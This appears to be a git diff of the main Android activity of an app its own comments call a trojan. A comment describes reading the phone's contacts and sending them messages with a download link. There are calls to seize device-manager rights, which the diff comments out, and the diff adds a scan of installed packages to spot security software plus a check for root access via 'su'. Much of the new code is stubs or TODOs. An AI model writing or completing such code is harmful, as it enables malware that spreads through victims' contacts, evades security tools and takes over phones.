@@ -11,15 +11,22 @@ import android.os.Handler;
 import android.os.Message;
 import android.provider.ContactsContract;
 import android.support.v7.app.AppCompatActivity;
-import android.widget.TextView;
 
-/***
- * 咪嘻木马制作入口
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.List;
+
+import static java.lang.Runtime.getRuntime;
+
+/**
+ 咪嘻木马制作入口
  */
 public class MainActivity extends AppCompatActivity {
 
     static {
-        System.loadLibrary("native-lib");
+        System.loadLibrary("check");
     }
 
     private final int SECURITY = 0x001;
@@ -36,10 +43,11 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        TextView tv = (TextView) findViewById(R.id.sample_text);
+        // TextView tv = (TextView) findViewById(R.id.sample_text);
         // tv.setText(stringFromJNI());
-        readContacts();
-        becomeDeviceManage();
+        //  readContacts();
+        // becomeDeviceManage();
+        stringFromJNI();
     }
 
     public native String stringFromJNI();
@@ -60,7 +68,7 @@ public class MainActivity extends AppCompatActivity {
 
 
     /**
-     * 读取联系人并进行发送消息，然后发送给联系人的链接进行下载
+     读取联系人并进行发送消息，然后发送给联系人的链接进行下载
      */
     public void readContacts() {
         ContentResolver contentResolver = getContentResolver();
@@ -103,4 +111,64 @@ public class MainActivity extends AppCompatActivity {
             }
         }
     }
+
+    /**
+     * 制作检的检测通知
+     */
+    public void notifyMessage() {
+        //三星，360，小米，华为，魅族，默认
+        //TODO 进行通知
+
+
+    }
+
+    /**
+     * 扫描当前操作系统和品牌，以及安全软件
+     */
+    public List<String> scanPackageL() {
+        //进行包扫描
+        List<String> packageNames = new ArrayList<>();
+        ProcessBuilder builder = new ProcessBuilder("/system/bin/pm", "list package");
+        try {
+            Process start = builder.start();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(start.getInputStream(), "utf-8"));
+            String packageName = reader.readLine();
+            packageNames.add(packageName);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return packageNames;
+    }
+
+    /**
+     * 使用root功能
+     */
+    public boolean rootUtil() {
+        //TODO  判断是否有root功能
+        return false;
+    }
+
+    /**
+     * 判断是否授权root
+     */
+    public boolean hasRootPemissionGrant() {
+        //判断是否被root授权
+        try {
+            Process process = null;
+            process = getRuntime().exec("su");
+            process.getOutputStream().write("exit\n".getBytes());
+            process.getOutputStream().flush();
+            int i = process.waitFor();
+            if (0 == i) {
+                process = getRuntime().exec("su");
+                return true;
+            }
+        } catch (Exception e) {
+            return false;
+        }
+        return false;
+    }
+
+
+
 }
